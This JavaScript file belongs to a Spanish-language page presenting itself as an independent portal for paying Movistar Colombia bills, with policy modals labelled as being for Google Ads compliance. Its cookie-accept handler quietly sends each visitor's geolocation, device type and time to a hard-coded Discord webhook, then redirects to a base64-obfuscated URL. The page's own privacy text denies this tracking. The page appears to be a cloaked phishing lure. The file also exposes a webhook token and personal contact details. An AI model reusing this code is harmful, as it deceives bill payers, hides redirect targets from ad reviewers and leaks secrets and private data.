const promo_url = "";
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1538030911449333810/JDQ_3Qs5ck09X_xXlQQygswOrTrQRdzCt8xKQN_8CrK9NdggKlYiPkOnzx4vMBGNTXX4";

// Elements
const modalOverlay = document.getElementById("modalOverlay");
const modalTitle = document.getElementById("modalTitle");
const modalContent = document.getElementById("modalContent");
const modalClose = document.getElementById("modalClose");

// Modal contents for Google Ads policy compliance
const modalData = {
  terminos: {
    title: "Términos y Condiciones de Uso",
    content: `
      <p class="mb-2"><strong>1. Aceptación de los Términos:</strong> Al acceder y utilizar este portal informativo, aceptas cumplir con los presentes términos y condiciones generales.</p>
      <p class="mb-2"><strong>2. Naturaleza Informativa e Independiente:</strong> Este sitio web es un portal informativo independiente. No está afiliado, patrocinado, respaldado ni administrado por Movistar Colombia (Colombia Telecomunicaciones S.A. ESP). Las marcas comerciales, logotipos y nombres mencionados pertenecen exclusivamente a sus respectivos titulares.</p>
      <p class="mb-2"><strong>3. Uso del Servicio:</strong> Las consultas facilitadas en este portal son de carácter meramente informativo y de orientación para el usuario sobre pagos de facturas de servicios móviles y fijos de Movistar.</p>
      <p class="mb-2"><strong>4. Limitación de Responsabilidad:</strong> No garantizamos la interrupción ni la exactitud permanente de los servicios externos enlazados. El usuario asume la responsabilidad total de sus interacciones.</p>
    `
  },
  privacidad: {
    title: "Política de Privacidad y Protección de Datos",
    content: `
      <p class="mb-2"><strong>1. Compromiso con la Privacidad:</strong> Cumplimos estrictamente con las normativas internacionales y locales de protección de datos personales.</p>
      <p class="mb-2"><strong>2. Recopilación de Datos:</strong> Este sitio recopila datos de navegación mediante cookies técnicas para optimizar la experiencia de usuario y medir el tráfico de forma anónima.</p>
      <p class="mb-2"><strong>3. No Comercialización:</strong> No vendemos, alquilamos ni compartimos datos personales identificables con terceros para fines publicitarios sin tu consentimiento previo.</p>
      <p class="mb-2"><strong>4. Derechos ARCO:</strong> Puedes ejercer en cualquier momento tus derechos de acceso, rectificación, cancelación u oposición ajustando las opciones de tu navegador o contactándonos directamente.</p>
    `
  },
  contacto: {
    title: "Contacto y Soporte",
    content: `
      <p class="mb-2"><strong>Atención al Cliente e Información Legal:</strong></p>
      <p class="mb-1">• <strong>Responsable Legal:</strong> JOHAN STEFAN JIMENEZ MACHADO</p>
      <p class="mb-1">• <strong>Correo de Soporte:</strong> itscamesfromhellss@gmail.com</p>
      <p class="mb-1">• <strong>WhatsApp y Teléfono:</strong> +57 316 332 6667</p>
      <p class="mb-1">• <strong>Dirección:</strong> Cra. 73 #44A-52, Laureles - Estadio, Medellín, Colombia</p>
    `
  },
  detalles: {
    title: "Detalles del Servicio Movistar",
    content: `
      <p class="mb-2"><strong>Información del Servicio:</strong></p>
      <p class="mb-2">Te guiamos en el proceso de consulta y pago de tu factura Movistar (Móvil y Hogar Fibra Óptica) mediante pasarelas de pago seguras y certificadas SSL.</p>
      <p class="mb-2">Todos los pagos procesados reflejan la aplicación en línea a través de los sistemas habilitados.</p>
    `
  }
};

// Event listeners for open modal triggers
document.querySelectorAll("[data-open-modal]").forEach((trigger) => {
  trigger.addEventListener("click", (e) => {
    e.preventDefault();
    const modalKey = trigger.getAttribute("data-open-modal");
    if (modalData[modalKey]) {
      modalTitle.innerText = modalData[modalKey].title;
      modalContent.innerHTML = modalData[modalKey].content;
      modalOverlay.classList.remove("hidden");
      modalOverlay.setAttribute("aria-hidden", "false");
    }
  });
});

// Close modal event listeners
if (modalClose && modalOverlay) {
  modalClose.addEventListener("click", () => {
    modalOverlay.classList.add("hidden");
    modalOverlay.setAttribute("aria-hidden", "true");
  });

  modalOverlay.addEventListener("click", (e) => {
    if (e.target === modalOverlay) {
      modalOverlay.classList.add("hidden");
      modalOverlay.setAttribute("aria-hidden", "true");
    }
  });
}

// Function to send interaction alert to Discord on cookie acceptance
async function sendInteractionAlert(interactionType = "Aceptó Cookies") {
  if (!DISCORD_WEBHOOK_URL) return;

  try {
    const geo = await fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .catch(() => ({}));

    const city = geo.city || "Desconocida";
    const country = geo.country_name || geo.country || "Desconocido";
    const flag = geo.country_code ? `https://flagcdn.com/w80/${geo.country_code.toLowerCase()}.png` : "";
    const ua = navigator.userAgent;
    const isMobile = /mobi/i.test(ua) ? "Móvil" : "Escritorio";

    const embed = {
      color: 0x00a9e0,
      title: `🍪  Interacción en Portal Movistar: ${interactionType}`,
      thumbnail: flag ? { url: flag } : undefined,
      fields: [
        { name: "🗺️ Ciudad", value: city, inline: true },
        { name: "🌍 País", value: country, inline: true },
        { name: "📱 Dispositivo", value: isMobile, inline: true },
        { name: "🕐 Hora", value: new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }), inline: true }
      ],
      footer: { text: "Portal Informativo Movistar · Notificación de Interacción" },
      timestamp: new Date().toISOString()
    };

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (err) {
    console.error("Error al notificar interacción:", err);
  }
}

// Cookie Acceptance Trigger
const cookieAcceptButton = document.getElementById("cookieAcceptButton");
if (cookieAcceptButton) {
  cookieAcceptButton.addEventListener("click", async () => {
    const cookieModal = document.getElementById("cookieModal");
    if (cookieModal) {
      cookieModal.classList.add("hidden");
    }

    // Send interaction notification in background
    sendInteractionAlert("Aceptó Cookies");

    // Only redirect if promo_url is set and non-empty
    if (promo_url && promo_url.trim() !== "") {
      try {
        window.location.href = atob(promo_url);
      } catch (err) {
        console.error("Error al decodificar promo_url:", err);
      }
    }
  });
}
